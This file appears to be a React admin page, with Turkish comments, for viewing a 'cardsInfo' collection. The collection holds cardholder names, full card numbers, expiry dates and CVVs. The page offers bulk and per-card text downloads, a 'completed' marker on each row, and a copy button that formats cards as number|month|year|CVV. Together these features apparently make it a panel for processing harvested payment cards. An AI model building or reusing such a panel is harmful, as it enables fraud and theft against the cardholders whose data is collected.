'use client';

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { HiOutlineLockClosed, HiOutlineUser, HiOutlineLogout, HiOutlineEye, HiOutlineRefresh, HiOutlineDownload, HiOutlineClipboardCopy, HiOutlineCheck } from 'react-icons/hi';

export default function SudoAdminPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [cardsData, setCardsData] = useState([]);
  const [dataLoading, setDataLoading] = useState(false);
  const [dataError, setDataError] = useState('');
  const [copiedRowId, setCopiedRowId] = useState(null);
  const [markedRows, setMarkedRows] = useState(new Set());

  // Check if already logged in
  useEffect(() => {
    const sudoAuth = localStorage.getItem('sudo_admin_auth');
    const apiKey = sessionStorage.getItem('sudo_api_key');
    
    // Sadece hem localStorage hem sessionStorage varsa otomatik giriş yap
    if (sudoAuth === 'authenticated_sudo' && apiKey) {
      setIsAuthenticated(true);
    } else if (sudoAuth === 'authenticated_sudo' && !apiKey) {
      // localStorage var ama session yok - tekrar giriş gerekli
      localStorage.removeItem('sudo_admin_auth');
    }
  }, []);

  // Load marked rows from localStorage
  useEffect(() => {
    const savedMarkedRows = localStorage.getItem('sudo_marked_rows');
    if (savedMarkedRows) {
      try {
        const parsed = JSON.parse(savedMarkedRows);
        setMarkedRows(new Set(parsed));
      } catch (e) {
        console.error('Marked rows parse error:', e);
      }
    }
  }, []);

  // Fetch cardsInfo data when authenticated
  useEffect(() => {
    if (isAuthenticated) {
      fetchCardsData();
    }
  }, [isAuthenticated]);

  // SADECE OKUMA - API üzerinden veri çekme fonksiyonu
  const fetchCardsData = async () => {
    setDataLoading(true);
    setDataError('');
    try {
      // sessionStorage'dan API key'i al (login sırasında kaydedildi)
      const apiKey = sessionStorage.getItem('sudo_api_key') || password;
      
      // Güvenli API route üzerinden veri çek
      const response = await fetch('/api/admin/cards', {
        headers: {
          'Authorization': `Bearer ${apiKey}` // Login şifresi ile doğrulama
        }
      });
      
      if (!response.ok) {
        if (response.status === 401) {
          throw new Error('Yetkisiz erişim - Şifre hatalı');
        }
        throw new Error('API hatası');
      }
      
      const result = await response.json();
      
      if (result.success) {
        // API'den gelen veriyi timestamp formatına çevir (UI için)
        const formattedData = result.data.map(item => ({
          ...item,
          createdAt: item.createdAt ? { seconds: new Date(item.createdAt).getTime() / 1000 } : null
        }));
        setCardsData(formattedData);
      } else {
        throw new Error(result.error || 'Bilinmeyen hata');
      }
    } catch (err) {
      console.error('Veri çekme hatası:', err);
      setDataError(err.message || 'Veriler yüklenirken bir hata oluştu.');
    } finally {
      setDataLoading(false);
    }
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');

    try {
      // API üzerinden şifre doğrulama (sunucu tarafında kontrol edilir)
      const response = await fetch('/api/admin/cards', {
        headers: {
          'Authorization': `Bearer ${password}`
        }
      });

      if (response.ok) {
        // Şifre doğru - giriş başarılı
        localStorage.setItem('sudo_admin_auth', 'authenticated_sudo');
        sessionStorage.setItem('sudo_api_key', password);
        setIsAuthenticated(true);
      } else if (response.status === 401) {
        setError('Şifre hatalı');
      } else {
        setError('Sunucu hatası, tekrar deneyin');
      }
    } catch (err) {
      console.error('Login error:', err);
      setError('Bağlantı hatası');
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('sudo_admin_auth');
    sessionStorage.removeItem('sudo_api_key');
    setIsAuthenticated(false);
    setCardsData([]);
    setUsername('');
    setPassword('');
  };

  // Get all unique keys from data for table headers - belirli sırayla
  const getTableHeaders = () => {
    if (cardsData.length === 0) return [];
    
    // İstenen sıralama: createdAt, cardHolder, cardNumber, cardExpiry, cardCvv
    const priorityOrder = ['createdAt', 'cardHolder', 'cardNumber', 'cardExpiry', 'cardCvv'];
    
    // Tüm benzersiz keyleri topla
    const allKeys = new Set();
    cardsData.forEach(item => {
      Object.keys(item).forEach(key => allKeys.add(key));
    });
    
    // Öncelikli sıralamaya göre düzenle
    const orderedHeaders = [];
    
    // Önce priority sırasındaki kolonları ekle (varsa)
    priorityOrder.forEach(key => {
      if (allKeys.has(key)) {
        orderedHeaders.push(key);
        allKeys.delete(key);
      }
    });
    
    // Kalan kolonları ekle (id hariç - en sona koyacağız)
    const remainingKeys = Array.from(allKeys).filter(key => key !== 'id');
    orderedHeaders.push(...remainingKeys);
    
    // id'yi en sona ekle
    if (allKeys.has('id') || cardsData.some(item => item.id)) {
      orderedHeaders.push('id');
    }
    
    return orderedHeaders;
  };

  // Format cell value for display
  const formatCellValue = (value) => {
    if (value === null || value === undefined) return '-';
    if (typeof value === 'boolean') return value ? '✓ Evet' : '✗ Hayır';
    if (typeof value === 'object') {
      if (value.seconds) {
        // Firestore Timestamp
        return new Date(value.seconds * 1000).toLocaleString('tr-TR');
      }
      return JSON.stringify(value, null, 2);
    }
    return String(value);
  };

  // TXT olarak indir fonksiyonu
  const handleDownloadTxt = () => {
    if (cardsData.length === 0) return;
    
    const headers = getTableHeaders();
    let txtContent = '';
    
    // Başlık satırı
    txtContent += '='.repeat(80) + '\n';
    txtContent += 'CARDS INFO VERİLERİ\n';
    txtContent += 'İndirme Tarihi: ' + new Date().toLocaleString('tr-TR') + '\n';
    txtContent += 'Toplam Kayıt: ' + cardsData.length + '\n';
    txtContent += '='.repeat(80) + '\n\n';
    
    // Her kayıt için
    cardsData.forEach((row, index) => {
      txtContent += '-'.repeat(60) + '\n';
      txtContent += `KAYIT #${index + 1}\n`;
      txtContent += '-'.repeat(60) + '\n';
      
      headers.forEach(header => {
        const value = formatCellValue(row[header]);
        txtContent += `${header}: ${value}\n`;
      });
      
      txtContent += '\n';
    });
    
    txtContent += '='.repeat(80) + '\n';
    txtContent += 'DOSYA SONU\n';
    txtContent += '='.repeat(80) + '\n';
    
    // Dosyayı indir
    const blob = new Blob([txtContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `cardsInfo_${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  // Satırı işaretleme fonksiyonu (localStorage'a kaydet)
  const toggleMarkRow = (rowId) => {
    setMarkedRows(prev => {
      const newSet = new Set(prev);
      if (newSet.has(rowId)) {
        newSet.delete(rowId);
      } else {
        newSet.add(rowId);
      }
      // localStorage'a kaydet
      localStorage.setItem('sudo_marked_rows', JSON.stringify([...newSet]));
      return newSet;
    });
  };

  // Kart bilgisini kopyalama fonksiyonu (format: cardNumber|expiryMonth|expiryYear|cvv)
  const handleCopyCardInfo = async (row) => {
    try {
      // Card number - boşlukları kaldır
      const cardNumber = row.cardNumber?.replace(/\s/g, '') || '';
      
      // Expiry date - MM/YY formatından ayır
      const expiry = row.cardExpiry || '';
      const [expiryMonth, expiryYear] = expiry.split('/').map(s => s?.trim() || '');
      
      // CVV
      const cvv = row.cardCvv || '';
      
      // Format: cardNumber|expiryMonth|expiryYear|cvv
      const formattedText = `${cardNumber}|${expiryMonth}|${expiryYear}|${cvv}`;
      
      await navigator.clipboard.writeText(formattedText);
      setCopiedRowId(row.id);
      
      // 2 saniye sonra kopyalandı işaretini kaldır
      setTimeout(() => {
        setCopiedRowId(null);
      }, 2000);
    } catch (err) {
      console.error('Kopyalama hatası:', err);
    }
  };

  // Tek satır için TXT indirme fonksiyonu
  const handleDownloadSingleRow = (row, index) => {
    const headers = getTableHeaders();
    let txtContent = '';
    
    txtContent += '='.repeat(60) + '\n';
    txtContent += `KAYIT #${index + 1}\n`;
    txtContent += 'İndirme Tarihi: ' + new Date().toLocaleString('tr-TR') + '\n';
    txtContent += '='.repeat(60) + '\n\n';
    
    headers.forEach(header => {
      const value = formatCellValue(row[header]);
      txtContent += `${header}: ${value}\n`;
    });
    
    txtContent += '\n' + '='.repeat(60) + '\n';
    
    // Dosyayı indir
    const blob = new Blob([txtContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    const cardHolder = row.cardHolder?.replace(/\s/g, '_') || 'unknown';
    link.download = `card_${cardHolder}_${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  // Login Screen
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center px-4 bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
        {/* Animated Background */}
        <div className="absolute inset-0 overflow-hidden">
          <div className="absolute -top-40 -right-40 w-80 h-80 bg-purple-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-pulse"></div>
          <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-cyan-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-pulse delay-1000"></div>
        </div>

        <motion.div
          initial={{ opacity: 0, y: 20, scale: 0.95 }}
          animate={{ opacity: 1, y: 0, scale: 1 }}
          transition={{ duration: 0.5 }}
          className="w-full max-w-md relative z-10"
        >
          <div className="bg-slate-800/80 backdrop-blur-xl rounded-3xl shadow-2xl p-8 border border-slate-700/50">
            <div className="text-center mb-8">
              <motion.div 
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ delay: 0.2, type: "spring", stiffness: 200 }}
                className="w-20 h-20 mx-auto mb-4 rounded-2xl bg-gradient-to-br from-cyan-500 to-purple-600 flex items-center justify-center shadow-lg shadow-purple-500/30"
              >
                <HiOutlineEye className="w-10 h-10 text-white" />
              </motion.div>
              <h1 className="text-2xl font-bold text-white">Sudo Admin</h1>
              <p className="text-slate-400 mt-2">Sadece Görüntüleme Paneli</p>
            </div>

            <form onSubmit={handleLogin} className="space-y-5">
              <div>
                <label className="text-sm font-medium text-slate-300 mb-2 block">Kullanıcı Adı</label>
                <div className="relative">
                  <HiOutlineUser className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400" />
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full h-14 pl-12 pr-4 bg-slate-700/50 border border-slate-600 rounded-xl text-white placeholder-slate-400 outline-none focus:border-cyan-500 focus:ring-2 focus:ring-cyan-500/20 transition-all"
                    placeholder="Kullanıcı adınızı girin"
                  />
                </div>
              </div>

              <div>
                <label className="text-sm font-medium text-slate-300 mb-2 block">Şifre</label>
                <div className="relative">
                  <HiOutlineLockClosed className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-slate-400" />
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full h-14 pl-12 pr-4 bg-slate-700/50 border border-slate-600 rounded-xl text-white placeholder-slate-400 outline-none focus:border-cyan-500 focus:ring-2 focus:ring-cyan-500/20 transition-all"
                    placeholder="Şifrenizi girin"
                  />
                </div>
              </div>

              <AnimatePresence>
                {error && (
                  <motion.p
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    className="text-red-400 text-sm text-center bg-red-500/10 border border-red-500/20 py-3 rounded-xl"
                  >
                    {error}
                  </motion.p>
                )}
              </AnimatePresence>

              <motion.button
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                type="submit"
                disabled={isLoading || !username || !password}
                className={`w-full h-14 rounded-xl font-semibold text-lg transition-all ${
                  isLoading || !username || !password
                    ? 'bg-slate-600 text-slate-400 cursor-not-allowed'
                    : 'bg-gradient-to-r from-cyan-500 to-purple-600 text-white hover:shadow-lg hover:shadow-purple-500/30'
                }`}
              >
                {isLoading ? (
                  <span className="flex items-center justify-center gap-2">
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    Giriş yapılıyor...
                  </span>
                ) : (
                  'Giriş Yap'
                )}
              </motion.button>
            </form>
          </div>
        </motion.div>
      </div>
    );
  }

  // Data Display Screen
  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
      {/* Header */}
      <header className="bg-slate-800/80 backdrop-blur-xl border-b border-slate-700/50 sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-cyan-500 to-purple-600 flex items-center justify-center">
                <HiOutlineEye className="w-6 h-6 text-white" />
              </div>
              <div>
                <h1 className="text-lg font-bold text-white">Sudo Admin Panel</h1>
                <p className="text-xs text-slate-400">cardsInfo Verileri (Sadece Görüntüleme)</p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <motion.button
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={fetchCardsData}
                disabled={dataLoading}
                className="flex items-center gap-2 px-4 py-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition-colors"
              >
                <HiOutlineRefresh className={`w-5 h-5 ${dataLoading ? 'animate-spin' : ''}`} />
                Yenile
              </motion.button>
              <motion.button
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={handleDownloadTxt}
                disabled={cardsData.length === 0 || dataLoading}
                className={`flex items-center gap-2 px-4 py-2 rounded-lg transition-colors ${
                  cardsData.length === 0 || dataLoading
                    ? 'bg-slate-600 text-slate-400 cursor-not-allowed'
                    : 'bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-400'
                }`}
              >
                <HiOutlineDownload className="w-5 h-5" />
                İndir (.txt)
              </motion.button>
              <motion.button
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={handleLogout}
                className="flex items-center gap-2 px-4 py-2 bg-red-500/20 hover:bg-red-500/30 text-red-400 rounded-lg transition-colors"
              >
                <HiOutlineLogout className="w-5 h-5" />
                Çıkış
              </motion.button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Stats */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="mb-6"
        >
          <div className="bg-slate-800/50 backdrop-blur-xl rounded-2xl border border-slate-700/50 p-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-slate-400 text-sm">Toplam Kayıt Sayısı</p>
                <p className="text-3xl font-bold text-white mt-1">{cardsData.length}</p>
              </div>
              <div className="w-14 h-14 rounded-xl bg-gradient-to-br from-cyan-500/20 to-purple-500/20 flex items-center justify-center">
                <HiOutlineEye className="w-7 h-7 text-cyan-400" />
              </div>
            </div>
          </div>
        </motion.div>

        {/* Data Table */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.1 }}
          className="bg-slate-800/50 backdrop-blur-xl rounded-2xl border border-slate-700/50 overflow-hidden"
        >
          <div className="p-6 border-b border-slate-700/50">
            <h2 className="text-xl font-bold text-white">cardsInfo Collection</h2>
            <p className="text-slate-400 text-sm mt-1">Bu veriler sadece görüntüleme amaçlıdır</p>
          </div>

          {dataLoading ? (
            <div className="flex items-center justify-center py-20">
              <div className="text-center">
                <div className="w-12 h-12 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
                <p className="text-slate-400">Veriler yükleniyor...</p>
              </div>
            </div>
          ) : dataError ? (
            <div className="flex items-center justify-center py-20">
              <div className="text-center">
                <p className="text-red-400 mb-4">{dataError}</p>
                <button
                  onClick={fetchCardsData}
                  className="px-4 py-2 bg-cyan-500 text-white rounded-lg hover:bg-cyan-600 transition-colors"
                >
                  Tekrar Dene
                </button>
              </div>
            </div>
          ) : cardsData.length === 0 ? (
            <div className="flex items-center justify-center py-20">
              <div className="text-center">
                <HiOutlineEye className="w-16 h-16 text-slate-600 mx-auto mb-4" />
                <p className="text-slate-400">Henüz veri bulunmuyor</p>
              </div>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="bg-slate-700/30">
                    {/* İşlemler sütunu - en solda sabit */}
                    <th className="px-3 py-3 text-center text-xs font-semibold text-cyan-400 uppercase tracking-wider whitespace-nowrap sticky left-0 bg-slate-700/50 z-10">
                      İşlemler
                    </th>
                    {getTableHeaders().map((header) => (
                      <th
                        key={header}
                        className="px-4 py-3 text-left text-xs font-semibold text-cyan-400 uppercase tracking-wider whitespace-nowrap"
                      >
                        {header}
                      </th>
                    ))}
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-700/30">
                  {cardsData.map((row, rowIndex) => {
                    const isMarked = markedRows.has(row.id);
                    return (
                    <motion.tr
                      key={row.id || rowIndex}
                      initial={{ opacity: 0, x: -20 }}
                      animate={{ opacity: 1, x: 0 }}
                      transition={{ delay: rowIndex * 0.02 }}
                      className={`transition-all duration-300 ${
                        isMarked 
                          ? 'bg-gradient-to-r from-emerald-600/30 via-green-500/20 to-emerald-600/30' 
                          : 'hover:bg-slate-700/20'
                      }`}
                    >
                      {/* İşlem butonları - en solda sabit */}
                      <td className={`px-3 py-4 text-center sticky left-0 z-10 transition-all duration-300 ${
                        isMarked 
                          ? 'bg-gradient-to-r from-emerald-600/40 to-green-500/30' 
                          : 'bg-slate-800/80'
                      }`}>
                        <div className="flex items-center gap-1.5 justify-center">
                          <button
                            onClick={() => toggleMarkRow(row.id)}
                            className={`p-2 rounded-lg transition-colors ${
                              isMarked
                                ? 'bg-green-500 text-white shadow-lg shadow-green-500/30'
                                : 'bg-green-500/20 hover:bg-green-500/30 text-green-400'
                            }`}
                            title={isMarked ? "İşareti kaldır" : "Tamamlandı olarak işaretle"}
                          >
                            <HiOutlineCheck className="w-4 h-4" />
                          </button>
                          <button
                            onClick={() => handleDownloadSingleRow(row, rowIndex)}
                            className="p-2 bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-400 rounded-lg transition-colors"
                            title="Bu kaydı indir"
                          >
                            <HiOutlineDownload className="w-4 h-4" />
                          </button>
                          <button
                            onClick={() => handleCopyCardInfo(row)}
                            className={`p-2 rounded-lg transition-colors ${
                              copiedRowId === row.id 
                                ? 'bg-green-500/30 text-green-400' 
                                : 'bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-400'
                            }`}
                            title="Kart bilgisini kopyala"
                          >
                            {copiedRowId === row.id ? (
                              <HiOutlineCheck className="w-4 h-4" />
                            ) : (
                              <HiOutlineClipboardCopy className="w-4 h-4" />
                            )}
                          </button>
                        </div>
                      </td>
                      {getTableHeaders().map((header) => (
                        <td
                          key={`${row.id}-${header}`}
                          className="px-4 py-4 text-sm text-slate-300 whitespace-nowrap max-w-xs overflow-hidden text-ellipsis"
                          title={formatCellValue(row[header])}
                        >
                          {header === 'id' ? (
                            <span className="font-mono text-xs bg-slate-700/50 px-2 py-1 rounded">
                              {formatCellValue(row[header])}
                            </span>
                          ) : (
                            formatCellValue(row[header])
                          )}
                        </td>
                      ))}
                    </motion.tr>
                  );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </motion.div>

        {/* Warning Banner */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.3 }}
          className="mt-6 bg-amber-500/10 border border-amber-500/20 rounded-xl p-4"
        >
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-amber-500/20 flex items-center justify-center flex-shrink-0">
              <span className="text-xl">⚠️</span>
            </div>
            <div>
              <p className="text-amber-400 font-medium">Dikkat: Sadece Görüntüleme</p>
              <p className="text-amber-400/70 text-sm">Bu panel sadece verileri görüntülemek içindir. Hiçbir veri düzenleme veya silme işlemi yapılamaz.</p>
            </div>
          </div>
        </motion.div>
      </main>
    </div>
  );
}

